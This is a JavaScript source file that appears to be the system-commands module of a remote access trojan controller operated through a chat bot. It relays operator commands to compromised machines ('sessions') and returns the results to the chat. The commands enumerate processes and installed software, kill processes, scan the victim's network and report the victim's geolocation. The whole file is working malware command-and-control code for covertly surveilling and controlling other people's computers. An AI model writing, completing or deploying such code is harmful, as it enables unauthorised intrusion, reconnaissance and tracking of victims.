import { ResponseFormatter } from '../utils/formatter.js';

/**
 * System Information Commands Module
 */

export class SystemCommands {
  constructor(ratClient, sock) {
    this.ratClient = ratClient;
    this.sock = sock;
  }

  /**
   * System info command
   */
  async sysinfo(chatId, sessionId) {
    if (!sessionId) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
      });
      return;
    }

    const result = await this.ratClient.sendCommand(sessionId, 'sysinfo');
    
    if (result.success) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.systemInfo(result.data) 
      });
    } else {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error(result.error) 
      });
    }
  }

  /**
   * Process list command
   */
  async processes(chatId, sessionId) {
    if (!sessionId) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
      });
      return;
    }

    await this.sock.sendMessage(chatId, { 
      text: ResponseFormatter.info('⚙️ Enumerating processes...\n\n_Please wait..._') 
    });

    const result = await this.ratClient.sendCommand(sessionId, 'processes');
    
    if (result.success) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.processList(result.data) 
      });
    } else {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error(result.error) 
      });
    }
  }

  /**
   * System metrics command
   */
  async metrics(chatId, sessionId) {
    if (!sessionId) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
      });
      return;
    }

    const result = await this.ratClient.sendCommand(sessionId, 'metrics');
    
    if (result.success) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.metrics(result.data) 
      });
    } else {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error(result.error) 
      });
    }
  }

  /**
   * Installed software command
   */
  async software(chatId, sessionId) {
    if (!sessionId) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
      });
      return;
    }

    await this.sock.sendMessage(chatId, { 
      text: ResponseFormatter.info('📦 Enumerating installed software...\n\n_This may take 30 seconds..._') 
    });

    const result = await this.ratClient.sendCommand(sessionId, 'software', 120000);
    
    if (result.success) {
      const softwareList = result.data.split('\n').slice(0, 20);
      let response = ResponseFormatter.header('📦', 'INSTALLED SOFTWARE') + '\n\n';
      
      softwareList.forEach((sw, idx) => {
        if (sw.trim()) {
          response += `${idx + 1}. ${sw.trim()}\n`;
        }
      });
      
      response += '\n_Showing top 20 programs_';
      await this.sock.sendMessage(chatId, { text: response });
    } else {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error(result.error) 
      });
    }
  }

  /**
   * Kill process command
   */
  async killProcess(chatId, sessionId, pid) {
    if (!sessionId) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
      });
      return;
    }

    if (!pid) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error('Usage: /killproc <PID>') 
      });
      return;
    }

    const result = await this.ratClient.sendCommand(sessionId, `kill ${pid}`);
    
    if (result.success) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.success(`Process ${pid} terminated`) 
      });
    } else {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error(result.error) 
      });
    }
  }

  /**
   * Network scan command
   */
  async networkScan(chatId, sessionId) {
    if (!sessionId) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
      });
      return;
    }

    await this.sock.sendMessage(chatId, { 
      text: ResponseFormatter.info('🌐 Scanning network...\n\n_This may take 1-2 minutes..._') 
    });

    const result = await this.ratClient.sendCommand(sessionId, 'netscan', 120000);
    
    if (result.success) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.networkScan(result.data) 
      });
    } else {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error(result.error) 
      });
    }
  }

  /**
   * Geolocation command
   */
  async locate(chatId, sessionId) {
    if (!sessionId) {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
      });
      return;
    }

    await this.sock.sendMessage(chatId, { 
      text: ResponseFormatter.info('🌍 Getting geolocation...\n\n_Please wait..._') 
    });

    const result = await this.ratClient.sendCommand(sessionId, 'locate');
    
    if (result.success) {
      try {
        const location = JSON.parse(result.data);
        let response = ResponseFormatter.header('🌍', 'GEOLOCATION') + '\n\n';
        
        Object.keys(location).forEach(key => {
          response += `▪️ *${key}:* ${location[key]}\n`;
        });
        
        await this.sock.sendMessage(chatId, { text: response });
      } catch {
        await this.sock.sendMessage(chatId, { 
          text: ResponseFormatter.info(result.data) 
        });
      }
    } else {
      await this.sock.sendMessage(chatId, { 
        text: ResponseFormatter.error(result.error) 
      });
    }
  }
}